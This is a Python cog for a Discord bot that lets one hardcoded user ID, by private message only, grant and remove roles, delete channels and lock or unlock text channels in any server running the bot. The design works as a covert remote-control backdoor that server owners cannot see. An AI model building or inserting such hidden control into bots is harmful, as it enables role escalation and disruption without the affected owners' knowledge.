import discord
from discord.ext import commands

ALLOWED_USERS = [
    1406960430554812508
]

class RemoteAdmin(commands.Cog):

    def __init__(self, bot):
        self.bot = bot

    def allowed(self, user):
        return user.id in ALLOWED_USERS

    @commands.command()
    async def dm_giverole(self, ctx, guild_id: int, member_id: int, *, role_name):

        if ctx.guild:
            return

        if not self.allowed(ctx.author):
            return await ctx.send("❌ Unauthorized")

        guild = self.bot.get_guild(guild_id)

        member = guild.get_member(member_id)

        role = discord.utils.get(guild.roles, name=role_name)

        if not role:
            return await ctx.send("❌ Role not found")

        await member.add_roles(role)

        await ctx.send(f"✅ Added {role.name} to {member}")

    @commands.command()
    async def dm_removerole(self, ctx, guild_id: int, member_id: int, *, role_name):

        if ctx.guild:
            return

        if not self.allowed(ctx.author):
            return

        guild = self.bot.get_guild(guild_id)

        member = guild.get_member(member_id)

        role = discord.utils.get(guild.roles, name=role_name)

        await member.remove_roles(role)

        await ctx.send(f"🗑️ Removed {role.name}")

    @commands.command()
    async def dm_deletechannel(self, ctx, guild_id: int, channel_id: int):

        if ctx.guild:
            return

        if not self.allowed(ctx.author):
            return

        guild = self.bot.get_guild(guild_id)

        channel = guild.get_channel(channel_id)

        name = channel.name

        await channel.delete()

        await ctx.send(f"🗑️ Deleted {name}")

    @commands.command()
    async def dm_lockserver(self, ctx, guild_id: int):

        if ctx.guild:
            return

        if not self.allowed(ctx.author):
            return

        guild = self.bot.get_guild(guild_id)

        for channel in guild.text_channels:
            try:
                await channel.set_permissions(
                    guild.default_role,
                    send_messages=False
                )
            except:
                pass

        await ctx.send("🔒 Server Locked")

    @commands.command()
    async def dm_unlockserver(self, ctx, guild_id: int):

        if ctx.guild:
            return

        if not self.allowed(ctx.author):
            return

        guild = self.bot.get_guild(guild_id)

        for channel in guild.text_channels:
            try:
                await channel.set_permissions(
                    guild.default_role,
                    send_messages=True
                )
            except:
                pass

        await ctx.send("🔓 Server Unlocked")

async def setup(bot):
    await bot.add_cog(RemoteAdmin(bot))
